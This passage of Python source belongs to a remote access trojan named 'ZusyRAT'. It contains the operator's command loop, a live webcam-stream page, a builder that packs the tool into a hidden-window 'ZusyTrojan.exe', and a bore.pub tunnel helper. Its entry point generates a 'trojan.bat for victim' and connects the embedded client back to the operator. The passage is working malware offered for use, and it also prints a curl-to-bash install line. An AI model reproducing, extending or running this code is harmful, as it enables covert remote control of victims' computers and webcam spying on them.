                    port = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5555
                    self._start_webcam_live(port); continue
                parts = cmd.split(' ', 1); base = parts[0].lower(); args = parts[1] if len(parts) > 1 else ''
                # Map full names to short codes
                short = self.CMD_MAP.get(base, base)
                if base == 'webcam' and self._wc_active:
                    cprint("[!] Webcam live active. Run 'webcam_live_stop' first.", Colors.RED)
                    self._print_prompt(); continue
                self.cmd_id += 1
                m = {'c': short, 'i': self.cmd_id}
                if args: m['a'] = args
                cprint(f"[*] Sending: {base} ({short})", Colors.BLUE)
                send_msg(self.conn, m)
            except KeyboardInterrupt:
                cprint("\n[*] Interrupted.", Colors.YELLOW); self._stop_webcam_live(); self.running = False; break
            except Exception as e: cprint(f"[!] Error: {e}", Colors.RED); traceback.print_exc()
        self.cleanup()

    def cleanup(self):
        self._stop_webcam_live()
        try: self.conn.close()
        except: pass
        try: self.server.close()
        except: pass


# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                  HTML PAGE — MODERN LIVE UI                      ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ZUSYRAT — STREAM</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e27;font-family:'Courier New',monospace;color:#0f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:10px;overflow:hidden}
.container{width:100%;max-width:1400px;position:relative}
.header{position:absolute;top:10px;left:10px;font-size:12px;color:#0f0;z-index:10;text-shadow:0 0 5px #0f0}
.header span{display:inline-block;margin-right:20px}
.status-dot{display:inline-block;width:8px;height:8px;background:#0f0;border-radius:50%;margin-right:5px;animation:blink 1.5s infinite;vertical-align:middle}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
.video-frame{position:relative;width:100%;aspect-ratio:16/9;background:#000;border:2px solid #0f0;box-shadow:0 0 20px rgba(0,255,0,0.3),inset 0 0 20px rgba(0,255,0,0.1);overflow:hidden}
.video-stream{width:100%;height:100%;display:block;object-fit:contain;background:#000}
.scanlines{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,255,0,0.03) 0px,rgba(0,255,0,0.03) 1px,transparent 1px,transparent 2px);z-index:2}
.corner-marker{position:absolute;width:15px;height:15px;border:2px solid #0f0;z-index:5}
.corner-tl{top:5px;left:5px;border-right:none;border-bottom:none}
.corner-tr{top:5px;right:5px;border-left:none;border-bottom:none}
.corner-bl{bottom:5px;left:5px;border-right:none;border-top:none}
.corner-br{bottom:5px;right:5px;border-left:none;border-top:none}
.info-overlay{position:absolute;bottom:10px;right:10px;z-index:10;font-size:11px;color:#0f0;text-shadow:0 0 5px #0f0;text-align:right;line-height:1.4}
.info-overlay div{margin-bottom:3px}
.label{color:#0a0;font-weight:bold}
.value{color:#0f0}
@media(max-width:768px){.header{font-size:10px}.header span{display:block;margin-right:0;margin-bottom:5px}.info-overlay{font-size:9px;bottom:5px;right:5px}.corner-marker{width:12px;height:12px}}
</style>
</head>
<body>
<div class="container">
<div class="header"><span><span class="status-dot"></span>ZUSYRAT_STREAM</span><span>v4.2</span><span id="timeCounter">--:--:--</span></div>
<div class="video-frame">
<img id="videoStream" class="video-stream" src="/stream" alt="Stream" />
<div class="scanlines"></div>
<div class="corner-marker corner-tl"></div><div class="corner-marker corner-tr"></div><div class="corner-marker corner-bl"></div><div class="corner-marker corner-br"></div>
<div class="info-overlay"><div><span class="label">FRAMES:</span> <span class="value" id="frameCount">0</span></div><div><span class="label">UPTIME:</span> <span class="value" id="uptime">00:00:00</span></div><div><span class="label">QUALITY:</span> <span class="value">85%</span></div></div>
</div></div>
<script>
const img=document.getElementById('videoStream');let fc=0;let st=Date.now();
function us(){const ts=Date.now();img.src='/stream?t='+ts;fc++;us2()}
function us2(){const e=(Date.now()-st)/1000;document.getElementById('uptime').textContent=String(Math.floor(e/3600)).padStart(2,'0')+':'+String(Math.floor(e%3600/60)).padStart(2,'0')+':'+String(Math.floor(e%60)).padStart(2,'0');document.getElementById('frameCount').textContent=fc}
setInterval(us,500);setInterval(()=>{document.getElementById('timeCounter').textContent=new Date().toLocaleTimeString()},500);us();
</script>
</body>
</html>"""


# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                    EXECUTABLE BUILDER                            ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

def build_exe():
    print("[*] Building EXE...")
    try: import PyInstaller
    except ImportError: print("[!] PyInstaller not installed. Run: pip install pyinstaller"); return
    hidden = []
    for m in ['PIL', 'PIL.Image', 'PIL.ImageGrab', 'cv2', 'cv2.data', 'numpy', 'Crypto', 'Crypto.Cipher']:
        hidden += ['--hidden-import', m]
    extra = []
    try:
        import cv2; cv2_dir = os.path.dirname(cv2.__file__)
        extra = ['--add-binary', f'{cv2_dir}/*.dll:.']
    except: pass
    cmd = ['pyinstaller', '--onefile', '--noconsole', '--clean', '--strip', '--noupx', '--name', 'ZusyTrojan'] + hidden + extra + [sys.argv[0]]
    print(f"[*] Running: {' '.join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode == 0: cprint(f"[+] SUCCESS! EXE: dist/ZusyTrojan.exe", Colors.GREEN)
    else: print(f"[!] Build failed:\n{r.stderr[:2000]}")


# ═══════════════════════════════════════════════════════════════════
#  AUTO-BORE HELPER
# ═══════════════════════════════════════════════════════════════════

def start_bore_tunnel(port=4444, timeout=20):
    try:
        cprint(f"[*] Starting bore tunnel on port {port}...", Colors.YELLOW)
        proc = subprocess.Popen(['bore', 'local', str(port), '--to', 'bore.pub'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        start = time.time(); bore_url = None
        while time.time() - start < timeout:
            line = proc.stdout.readline()
            if not line: time.sleep(0.1); continue
            line = line.strip(); print(f"  {line}")
            for pat in [r'(https?://\S+)', r'([a-zA-Z0-9-]+\.bore\.pub)', r'(bore\.pub:\d+)']:
                m = re.search(pat, line)
                if m: bore_url = m.group(1); cprint(f"\n{'='*60}", Colors.GREEN + Colors.BOLD); cprint(f"  PUBLIC URL: {bore_url}", Colors.GREEN + Colors.BOLD); cprint(f"{'='*60}\n", Colors.GREEN + Colors.BOLD); return bore_url, proc
        cprint(f"[!] Bore tunnel URL could not be detected (timeout {timeout}s).", Colors.RED)
        return None, proc
    except FileNotFoundError:
        cprint("[!] 'bore' not found. Install: cargo install bore-cli", Colors.RED)
        cprint("    Or: curl -fsSL https://bore.pub/install.sh | bash", Colors.YELLOW)
        return None, None
    except Exception as e: cprint(f"[!] Bore error: {e}", Colors.RED); return None, None

def parse_bore_url(bore_url):
    if not bore_url: return None, None
    m = re.match(r'bore\.pub[:\s]*(\d+)', bore_url)
    if m: return 'bore.pub', int(m.group(1))
    m = re.match(r'https?://([a-zA-Z0-9-]+\.bore\.pub)', bore_url)
    if m: return m.group(1), 80
    m = re.match(r'([a-zA-Z0-9-]+\.bore\.pub)', bore_url)
    if m: return m.group(1), 80
    m = re.match(r'([^:]+):(\d+)', bore_url)
    if m: return m.group(1), int(m.group(2))
    return bore_url, 4444


# ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
# ┃                        ENTRY POINT                               ┃
# ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

if __name__ == '__main__':
    if '--build' in sys.argv: build_exe(); sys.exit(0)
    use_bore = True
    if '--no-bore' in sys.argv: use_bore = False; sys.argv.remove('--no-bore')

    if '--listen' in sys.argv or len(sys.argv) < 3:
        try:
            idx = sys.argv.index('--listen')
            port = int(sys.argv[idx + 1]) if len(sys.argv) > idx + 1 else 4444
        except (ValueError, IndexError): port = 4444
        bore_proc = None; bore_host = 'bore.pub'; bore_port = port
        if use_bore:
            bore_url, bore_proc = start_bore_tunnel(port)
            if bore_url:
                bh, bp = parse_bore_url(bore_url)
                if bh and bp: bore_host = bh; bore_port = bp; cprint(f"[*] Bore parsed: host={bore_host}, port={bore_port}", Colors.CYAN)
        cprint("\n[*] Generating trojan.bat for victim...", Colors.YELLOW)
        generate_trojan_bat(bore_host, bore_port)
        print()
        listener = ZusyListener(port=port)
        try: listener.start()
        finally:
            if bore_proc:
                cprint("[*] Stopping bore tunnel...", Colors.YELLOW); bore_proc.terminate()
                try: bore_proc.wait(timeout=3)
                except: bore_proc.kill()
    else:
        if len(sys.argv) < 3:
            print("USAGE:")
            print("  Server:   python3 zusy.py                         # auto bore + auto bat")
            print("  Server:   python3 zusy.py --listen 4444           # manual port")
            print("  Server:   python3 zusy.py --listen 4444 --no-bore # bore'suz")
            print("  Client:   python zusy.py bore.pub 14663")
            print("  Build:    python3 zusy.py --build")
            sys.exit(1)
        try:
            exec(TROJAN_CLIENT_CODE.replace(
                'if __name__==\'__main__\':',
                f'if __name__==\'__main__\':\n Z("{sys.argv[1]}",{int(sys.argv[2])}).run()\n sys.exit(0)'
            ))
        except Exception as e: print(f"[!] Connection error: {e}"); sys.exit(1)
